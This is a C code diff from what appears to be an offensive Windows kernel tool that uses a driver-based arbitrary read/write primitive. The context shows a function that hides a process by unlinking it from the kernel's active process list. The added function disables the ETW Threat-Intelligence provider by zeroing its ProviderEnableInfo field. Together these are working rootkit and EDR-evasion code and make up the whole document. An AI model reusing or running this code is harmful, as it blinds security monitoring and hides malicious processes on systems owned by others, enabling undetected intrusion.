@@ -787,8 +787,6 @@ VOID hideProc(HANDLE hDevice, DWORD64 pid) {
 		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);
 		DWORD64 blink = Read64(hDevice, currPtr + activeProcessLinksOffset + 0x8);
 
-		
-
 		if (currPid == pid) {
 			printf("Unlinking proc %d\n", pid);
 			// scrivo il flink del blink
@@ -814,4 +812,32 @@ VOID hideProc(HANDLE hDevice, DWORD64 pid) {
 			return;
 		}
 	}
+}
+
+VOID disableWTI(HANDLE hDevice) {
+	DWORD64 etWThreatIntProvRegHandleoff = EzPdbGetRva(&pdb, "EtwThreatIntProvRegHandle");
+
+	DWORD64 regEntry_guidEntry = EzPdbGetStructPropertyOffset(&pdb, "_ETW_REG_ENTRY", L"GuidEntry");
+
+	DWORD64 GuidEntry_ProviderEnableInfo = EzPdbGetStructPropertyOffset(&pdb, "_ETW_GUID_ENTRY", L"ProviderEnableInfo");
+
+
+
+
+	DWORD64 etwtiProvReghandle = ntoskrnlBase + etWThreatIntProvRegHandleoff;
+
+	DWORD64 ETWTI_ETW_REG_ENTRY = Read64(hDevice, etwtiProvReghandle) + regEntry_guidEntry;
+
+	DWORD64 providerEnableInfoAddress = Read64(hDevice, ETWTI_ETW_REG_ENTRY) + GuidEntry_ProviderEnableInfo;
+
+	printf("[+] ETWTI ProviderEnableInfo address = 0x%llx\n", providerEnableInfoAddress);
+
+
+	printf("[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", (Read64(hDevice,providerEnableInfoAddress) & 0xFF));
+
+	printf("[+] Disabling ETWTI Provider:\n");
+	Write64(hDevice, providerEnableInfoAddress, (DWORD64)0x0);
+
+	printf("[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", (Read64(hDevice, providerEnableInfoAddress) & 0xFF));
+
 }
